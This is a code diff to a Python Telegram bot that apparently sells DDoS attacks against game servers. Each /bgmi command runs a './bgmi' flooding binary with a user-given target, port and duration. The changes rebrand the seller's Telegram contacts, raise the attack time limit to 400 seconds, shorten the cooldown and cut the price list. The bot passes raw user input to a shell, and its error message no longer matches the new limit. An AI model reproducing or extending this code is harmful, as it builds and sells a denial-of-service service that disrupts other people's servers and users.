@@ -207,7 +207,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: IPxKING"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: IPxking"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -235,13 +235,13 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 181:
-                response = "Error: Time interval must be less than 181."
+            if time > 400:
+                response = "Error: Time interval must be less than 180."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 300"
+                full_command = f"./bgmi {target} {port} {time} 180"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
@@ -285,8 +285,8 @@ def show_help(message):
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
-Buy From :- @HAT_BUG_VISHU
-Official Channel :- https://t.me/HAT_BUG
+Buy From :- @IPXKING_OWNER
+Official Channel :- https://t.me/+6pLYLxgt8QI5ZmFl
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -303,7 +303,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
 🤖Try To Run This Command : /help 
-✅Join :- https://t.me/HAT_BUG'''
+✅Join :- https://t.me/+rKFrj4pzEHIzMGU9'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -322,14 +322,14 @@ def welcome_plan(message):
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip 🌟 :
--> Attack Time : 180 (S)
-> After Attack Limit : 5 Min
--> Concurrents Attack : 3
+-> Attack Time : 400 (S)
+> After Attack Limit : 1 Min
+-> Concurrents Attack : 4
 
 Pr-ice List💸 :
-Day-->300 Rs
-Week-->1000 Rs
-Month-->2000 Rs
+Day-->150 Rs
+Week-->700 Rs
+Month-->1000 Rs
 '''
     bot.reply_to(message, response)
 
